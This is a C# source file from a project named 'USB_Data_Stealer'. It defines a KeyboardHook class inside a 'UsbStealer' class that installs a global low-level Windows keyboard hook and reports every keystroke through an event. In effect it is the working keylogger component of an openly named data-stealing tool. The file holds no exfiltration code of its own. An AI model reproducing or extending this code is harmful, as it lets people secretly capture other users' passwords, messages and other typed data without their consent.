using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Input;

namespace USB_Data_Stealer.Core
{
    partial class UsbStealer
    {
        private partial class KeyboardHook
        {
            private const int WhKeyboardLl = 13;
            private const int WmKeydown = 0x0100;
            private const int WmSyskeydown = 0x0104;

            private readonly LowLevelKeyboardProc _proc;
            private IntPtr _hookId = IntPtr.Zero;

            public KeyboardHook()
            {
                _proc = HookCallback;
            }

            public event EventHandler<KeyPressedArgs> OnKeyPressed;

            public void HookKeyboard()
            {
                _hookId = SetHook(_proc);
            }

            public void UnHookKeyboard()
            {
                NativeMethods.UnhookWindowsHookEx(_hookId);
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return NativeMethods.SetWindowsHookEx(WhKeyboardLl, proc,
                        NativeMethods.GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if ((nCode < 0 || wParam != (IntPtr) WmKeydown) && wParam != (IntPtr) WmSyskeydown)
                    return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
                int vkCode = Marshal.ReadInt32(lParam);

                OnKeyPressed?.Invoke(this, new KeyPressedArgs(KeyInterop.KeyFromVirtualKey(vkCode)));

                return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
            }

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        }

        private class KeyPressedArgs : EventArgs
        {
            public KeyPressedArgs(Key key)
            {
                KeyPressed = key;
            }

            public Key KeyPressed { get; }
        }
    }
}